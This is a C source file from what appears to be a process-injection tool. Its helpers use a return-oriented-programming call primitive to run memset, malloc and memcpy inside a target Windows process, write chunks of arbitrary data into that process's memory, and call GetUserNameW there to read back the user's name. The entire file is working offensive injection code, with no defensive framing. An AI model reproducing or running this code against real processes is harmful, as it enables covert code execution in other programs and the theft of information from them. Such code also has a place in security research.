#include <stdlib.h>
#include <wchar.h>
#include <assert.h>

#include "crp.h"
#include "injector.h"

// ====================================================================================
// ROP CRP definitions.
// ------------------------------------------------------------------------------------

// ------------------------------------------------------------------------------------
// remote_memset
// ------------------------------------------------------------------------------------

int32_t remote_memset(uint64_t address, uint8_t value, uint64_t size) {    
    printf("[*] (remote_memset) remote_memset(0x%llx, 0x%x, 0x%llx).\n", address, value, size);
    
    return remote_find_and_call(
        "ucrtbase.dll",
        "memset",
        0,                // data
        0,                // data_size
        0,                // out
        3,                // argc
        address,
        value,
        size);
}

// ------------------------------------------------------------------------------------
// remote_malloc
// ------------------------------------------------------------------------------------

int32_t remote_malloc(uint64_t size, uint64_t *out_ptr) {
    int32_t ret;
    
    printf("[*] (remote_malloc) Executing remote malloc(0x%llx).\n", size);
    
    uint8_t *out;
    
    if ((ret = remote_find_and_call(
            "ucrtbase.dll",
            "malloc",
            0,            // data
            0,            // data_size
            &out,         // out
            1,            // argc
            size)) < 0) {
                
        return ret;
    }
    
    *out_ptr = *(uint64_t*)out;
    
    printf("[*] (remote_malloc) Allocated remote buffer in 0x%llx.\n", *out_ptr);
    return ret;
}

// ------------------------------------------------------------------------------------
// copy_to_target
// ------------------------------------------------------------------------------------

int32_t copy_to_target(uint64_t dest_addr, uint8_t *source, uint64_t size) {
    int32_t ret;

    uint64_t r_ucrtbase;
    uint64_t r_memcpy;

    if ((ret = remote_LoadLibrary("ucrtbase.dll", &r_ucrtbase)) < 0) {
        return ret;
    }
    if ((ret = remote_GetProcAddress(r_ucrtbase, "memcpy", &r_memcpy)) < 0) {
        return ret;
    }
    
    printf("[*] (copy_to_target) Copying 0x%llx bytes to 0x%llx in remote host.\n", size, dest_addr);
    
    /* Compute how much data we can copy at most in one single call. Take the space
     * left for data after given code above. Check that there is more than 8 bytes,
     * as we also need 8 bytes for target label.
     * 
     */
    uint64_t max_data = get_max_input_data_size();
    
    if (max_data <= 8) {
        return -1;
    }
    
    /* Create data buffer to hold max_data bytes, and then set target label
     * as the first element.
     *
     */
    uint8_t *data = (uint8_t*) malloc(max_data);
    *(uint64_t*)data = MAKE_TARGET(1);
    
    /* Perform CRPs until the whole content has been copied.
     *
     */
    uint64_t copied = 0;

    while (copied < size) {
        uint64_t chunk_size = 0;
        
        if (size - copied < max_data - 8) {
            chunk_size = size - copied;
        } else {
            chunk_size = max_data - 8;
        }
        
        memcpy(data + 8, source + copied, chunk_size);
        
        printf("[*] (copy_to_target) Sending 0x%llx bytes for copying from 0x%llx.\n", 
            chunk_size, 
            dest_addr + copied);
        
        if ((ret = remote_find_and_call(
                "ucrtbase.dll",
                "memcpy",
                data,             // data
                chunk_size + 8,   // data_size
                0,                // out
                3,
                dest_addr + copied,
                MAKE_REFERENCE(1),
                chunk_size)) < 0) {
                
            break;
        }
    
        copied += chunk_size;
        printf("[*] (copy_to_target) Copied 0x%llx bytes so far. \n", copied);
    }

    printf("[*] (copy_to_target) Copied 0x%llx bytes to 0x%llx in target's space.\n", 
        size, 
        dest_addr);
    
    free(data);
    return 0;
}

// ------------------------------------------------------------------------------------
// remote_GetUserNameW
// ------------------------------------------------------------------------------------

int32_t remote_GetUserNameW(wchar_t *out_buff, uint32_t *cap_wchars) {
    int32_t ret;
    
    uint64_t r_user_name_length = get_out_storage_base() + 8;
    uint64_t r_user_name = get_out_storage_base() + 16;
    
    uint64_t cap = *cap_wchars;
    
    /* Copy input length to target in get_out_storage_base() + 8;
     * this qword will be used as both input and output. We don't use
     * get_out_storage_base() + 0, because the remote procedure's
     * return value is always stored there, so the username length
     * would be overwritten.
     *
     */
    printf("[*] (remote_GetUserNameW) Copying input length to target for GetUserNameW.\n");
    copy_to_target(r_user_name_length, (uint8_t*)&cap, sizeof(uint64_t));
    
    /* Perform actual call to GetUserNameW.
     *
     */
    printf("[*] (remote_GetUserNameW) Executing remote GetUserNameW.\n");
    
    uint8_t *out;
    
    if ((ret = remote_find_and_call(
            "advapi32.dll",
            "GetUserNameW",
            0,              // data
            0,              // data_size
            &out,           // out
            2,              // argc
            r_user_name,
            r_user_name_length)) < 0) {
                
        return ret;
    }
    
    uint64_t uname_len_bytes = 2*(*(uint64_t*)(out + 8));
    
    /* Copy username from retrieved output data section to output buffer,
     * and make sure that last null char is set.
     *
     */
    assert(uname_len_bytes <= 2*(*cap_wchars));
    memcpy(out_buff, out + 16, uname_len_bytes);
    out_buff[uname_len_bytes/2 - 1] = L'\0';
    
    *cap_wchars = uname_len_bytes/2;
    
    wprintf(L"[*] (remote_GetUserNameW) Found remote username to be %s.\n", out_buff);
    return ret;
}